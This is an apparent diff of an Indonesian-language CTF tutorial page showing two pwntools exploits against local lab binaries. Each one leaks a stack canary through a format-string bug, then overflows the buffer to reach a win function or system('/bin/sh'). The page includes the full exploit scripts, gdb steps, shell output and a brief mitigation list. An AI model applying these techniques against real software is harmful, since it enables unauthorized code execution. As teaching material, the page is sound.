+</span></span><span style="display:flex;"><span>func_addr = int(func_leak, <span style="color:#f60">16</span>)
+</span></span><span style="display:flex;"><span>log.info(<span style="color:#87ceeb">&#34;Function address: 0x</span><span style="color:#87ceeb">%x</span><span style="color:#87ceeb">&#34;</span> % func_addr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Hitung base address libc (contoh, sesuaikan dengan environment)</span>
+</span></span><span style="display:flex;"><span>libc_base = func_addr - <span style="color:#f60">0x12345</span>  <span style="color:#0f0"># Offset yang didapat dari GDB</span>
+</span></span><span style="display:flex;"><span>system_addr = libc_base + <span style="color:#f60">0x3ada0</span>  <span style="color:#0f0"># Offset system</span>
+</span></span><span style="display:flex;"><span>binsh_addr = libc_base + <span style="color:#f60">0x15ba0b</span>  <span style="color:#0f0"># Offset &#34;/bin/sh&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log.info(<span style="color:#87ceeb">&#34;System: 0x</span><span style="color:#87ceeb">%x</span><span style="color:#87ceeb">&#34;</span> % system_addr)
+</span></span><span style="display:flex;"><span>log.info(<span style="color:#87ceeb">&#34;/bin/sh: 0x</span><span style="color:#87ceeb">%x</span><span style="color:#87ceeb">&#34;</span> % binsh_addr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Build payload untuk overwrite return address</span>
+</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>payload += <span style="color:#87ceeb">&#39;A&#39;</span> * <span style="color:#f60">64</span>           <span style="color:#0f0"># Mengisi buffer</span>
+</span></span><span style="display:flex;"><span>payload += p32(canary)        <span style="color:#0f0"># Nilai canary yang benar</span>
+</span></span><span style="display:flex;"><span>payload += <span style="color:#87ceeb">&#39;B&#39;</span> * <span style="color:#f60">12</span>           <span style="color:#0f0"># Overwrite EBP dan padding</span>
+</span></span><span style="display:flex;"><span>payload += p32(system_addr)   <span style="color:#0f0"># Return address ke system()</span>
+</span></span><span style="display:flex;"><span>payload += p32(<span style="color:#f60">0xdeadbeef</span>)    <span style="color:#0f0"># Return address setelah system()</span>
+</span></span><span style="display:flex;"><span>payload += p32(binsh_addr)    <span style="color:#0f0"># Parameter untuk system()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Kirim payload</span>
+</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">&#39;&gt; &#39;</span>)
 </span></span><span style="display:flex;"><span>p.sendline(payload)
-</span></span><span style="display:flex;"><span>response = p.clean()
-</span></span><span style="display:flex;"><span>print(response.decode())
-</span></span><span style="display:flex;"><span>p.close()
-</span></span></code></pre></div><p><strong>Contoh Output:</strong></p>
-<pre tabindex="0"><code>You said: 0xffffd5cc 0x00000064 0xf7f9c580 0xffffffff ... 0x5c9e1a00 ... 0xf7de4c8d
-</code></pre><p>Cari nilai yang <strong>berakhiran <code>0x00</code></strong> (null byte), seperti <code>0x5c9e1a00</code>. Itu adalah canary. Misalnya ditemukan di posisi ke-13.</p>
-<p><strong>Script Leak Canary:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;Input: &#34;</span>)
-</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;%13$p&#39;</span>  <span style="color:#0f0"># Langsung ambil dari posisi yang diduga</span>
-</span></span><span style="display:flex;"><span>p.sendline(payload)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#0f0"># Parse output</span>
-</span></span><span style="display:flex;"><span>leaked_line = p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;You said:&#34;</span>).split(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#39;</span>)[-<span style="color:#f60">2</span>]  <span style="color:#0f0"># Ambil baris sebelum &#34;You said:&#34;</span>
-</span></span><span style="display:flex;"><span>canary = int(leaked_line, <span style="color:#f60">16</span>)  <span style="color:#0f0"># Konversi string hex ke integer</span>
-</span></span><span style="display:flex;"><span>log.info(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Leaked canary: </span><span style="color:#87ceeb">{</span>hex(canary)<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
-</span></span></code></pre></div><h2 id="6-langkah-2--3-bangun-payload-dan-hijack-control-flow">6. Langkah 2 &amp; 3: Bangun Payload dan Hijack Control Flow</h2>
-<p>Setelah canary diketahui, bangun payload overflow yang mempertahankan nilainya.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0"># Offset</span>
-</span></span><span style="display:flex;"><span>offset_to_canary = <span style="color:#f60">64</span>
-</span></span><span style="display:flex;"><span>offset_to_ret = offset_to_canary + <span style="color:#f60">4</span> + <span style="color:#f60">4</span>  <span style="color:#0f0"># +4 (canary) +4 (saved ebp)</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Kirim perintah untuk trigger return</span>
+</span></span><span style="display:flex;"><span>p.sendline(<span style="color:#87ceeb">&#39;exit&#39;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#0f0"># Alamat win (dapat dari gdb: p win, atau objdump -t bof4 | grep win)</span>
-</span></span><span style="display:flex;"><span>win_addr = <span style="color:#f60">0x80491a6</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#0f0"># Bangun payload</span>
-</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;A&#39;</span> * offset_to_canary   <span style="color:#0f0"># Isi buffer</span>
-</span></span><span style="display:flex;"><span>payload += p32(canary)              <span style="color:#0f0"># Timpa canary dengan nilai yang benar</span>
-</span></span><span style="display:flex;"><span>payload += <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;B&#39;</span> * <span style="color:#f60">4</span>                 <span style="color:#0f0"># Timpa Saved EBP (bisa junk data)</span>
-</span></span><span style="display:flex;"><span>payload += p32(win_addr)            <span style="color:#0f0"># Timpa Return Address</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p.sendline(payload)
-</span></span><span style="display:flex;"><span>p.interactive() <span style="color:#0f0"># Enjoy your shell!</span>
-</span></span></code></pre></div><h2 id="7-full-exploit-script">7. Full Exploit Script</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0">#!/usr/bin/env python3</span>
-</span></span><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>context.binary = <span style="color:#87ceeb">&#39;./bof4&#39;</span>
-</span></span><span style="display:flex;"><span>context.log_level = <span style="color:#87ceeb">&#39;info&#39;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#39;./bof4&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#0f0"># [1] LEAK CANARY</span>
-</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;Input: &#34;</span>)
-</span></span><span style="display:flex;"><span>p.sendline(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;%13$p&#39;</span>)  <span style="color:#0f0"># Ganti 13 dengan posisi canary yang sesuai</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>leak = p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;You said:&#34;</span>).split(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#39;</span>)[-<span style="color:#f60">2</span>]
-</span></span><span style="display:flex;"><span>canary = int(leak, <span style="color:#f60">16</span>)
-</span></span><span style="display:flex;"><span>log.success(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Canary leaked: </span><span style="color:#87ceeb">{</span>hex(canary)<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#0f0"># [2] BUILD OVERFLOW PAYLOAD</span>
-</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;Input: &#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>offset = <span style="color:#f60">64</span>
-</span></span><span style="display:flex;"><span>win_addr = <span style="color:#f60">0x80491a6</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>payload = flat({
-</span></span><span style="display:flex;"><span>    offset: p32(canary),  <span style="color:#0f0"># Letakkan canary yang benar di offset 64</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f60">72</span>: p32(win_addr)     <span style="color:#0f0"># Letakkan alamat win di offset 72</span>
-</span></span><span style="display:flex;"><span>})
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p.sendline(payload)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#0f0"># [3] GET SHELL</span>
 </span></span><span style="display:flex;"><span>p.interactive()
-</span></span></code></pre></div><p><strong>Penjelasan <code>flat()</code>:</strong><br>
-Fungsi <code>flat</code> dari pwntools secara pintar mengatur payload.</p>
-<ul>
-<li><code>{64: p32(canary)}</code> artinya di offset ke-64, tulis nilai canary.</li>
-<li><code>{72: p32(win_addr)}</code> artinya di offset ke-72, tulis alamat <code>win</code>.</li>
-<li>Area antara 64-72 (yaitu saved EBP) otomatis diisi junk data.</li>
-</ul>
-<p><strong>Eksekusi:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 exploit.py
-</span></span><span style="display:flex;"><span>[+] Canary leaked: 0x5c9e1a00
-</span></span><span style="display:flex;"><span>[*] Switching to interactive mode
-</span></span><span style="display:flex;"><span>$ id
-</span></span><span style="display:flex;"><span><span style="color:#eedd82">uid</span>=1000(user) <span style="color:#eedd82">gid</span>=1000(user) <span style="color:#eedd82">groups</span>=1000(user)
-</span></span><span style="display:flex;"><span>$
-</span></span></code></pre></div>
+</span></span></code></pre></div><h2 id="-langkah-9-debugging-dengan-gdb">🔍 Langkah 9: Debugging dengan GDB</h2>
+<p>Lakukan debugging untuk memverifikasi exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb format_vuln
+</span></span><span style="display:flex;"><span>pwndbg&gt; b *main+100  <span style="color:#0f0"># Breakpoint sebelum return</span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; run &lt; &lt;(python exploit.py)
+</span></span></code></pre></div><p>Periksa stack dan register:</p>
+<pre tabindex="0"><code>pwndbg&gt; x/10x $esp
+pwndbg&gt; info registers
+pwndbg&gt; stepi
+</code></pre><h2 id="-hasil-eksploitasi">🎯 Hasil Eksploitasi</h2>
+<p>Jalankan exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python exploit.py
+</span></span></code></pre></div><p><strong>Output:</strong></p>
+<pre tabindex="0"><code>[+] Starting local process &#39;./format_vuln&#39;: pid 5678
+[DEBUG] Received 0x2 bytes: &#34;&gt; &#34;
+[DEBUG] Sent 0x5 bytes: &#39;%22$p\n&#39;
+[DEBUG] Received 0xa bytes: &#34;0xabcd1234\n&#34;
+[*] Canary: 0xabcd1234
+[DEBUG] Received 0x2 bytes: &#34;&gt; &#34;
+[DEBUG] Sent 0x5 bytes: &#39;%5$p\n&#39;
+[DEBUG] Received 0xa bytes: &#34;0xffffd104\n&#34;
+[*] Stack address: 0xffffd104
+[*] Return address: 0xffffd0e0
+[DEBUG] Received 0x2 bytes: &#34;&gt; &#34;
+[DEBUG] Sent 0x5 bytes: &#39;%3$p\n&#39;
+[DEBUG] Received 0xa bytes: &#34;0x80492fd\n&#34;
+[*] Function address: 0x80492fd
+[*] System: 0xf7c3ada0
+[*] /bin/sh: 0xf7d5ba0b
+[DEBUG] Received 0x2 bytes: &#34;&gt; &#34;
+[DEBUG] Sent 0x4c bytes: &#39;A&#39; * 64 + &#39;\x34\x12\xcd\xab&#39; + &#39;B&#39; * 12 + &#39;\xa0\xad\xc3\xf7&#39; + &#39;\xef\xbe\xad\xde&#39; + &#39;\x0b\xba\xd5\xf7\n&#39;
+[DEBUG] Sent 0x5 bytes: &#39;exit\n&#39;
+[*] Switching to interactive mode
+$ whoami
+user
+$ cat flag.txt
+CTF{bypassed_canary_with_format_string}
+</code></pre><h2 id="-visualisasi-memory-layout">📊 Visualisasi Memory Layout</h2>
+<pre tabindex="0"><code>+-----------------+
+|     buf[64]    |  &lt;- Buffer overflow dimulai di sini
++-----------------+
+|     canary     |  &lt;- Offset 22 dari format string
++-----------------+
+|      EBP       |
++-----------------+
+|  return address|  &lt;- Target overwrite
++-----------------+
+|     parameter   |  &lt;- Address &#34;/bin/sh&#34;
++-----------------+
+</code></pre><h2 id="-mitigation">🛡️ Mitigation</h2>
+<ol>
+<li><strong>Gunakan format string yang aman</strong>: <code>printf(&quot;%s&quot;, buf)</code></li>
+<li><strong>Enable Full RELRO</strong>: Mencegah overwrite GOT</li>
+<li><strong>Enable Stack Guard</strong>: Sudah enabled dengan canary</li>
+<li><strong>Enable PIE</strong>: Randomize address code</li>
+</ol>
+<p>Dengan teknik ini, kita berhasil memanfaatkan kerentanan format string untuk leak canary dan melakukan ROP attack</p>
+
 </article>
 
 <hr>
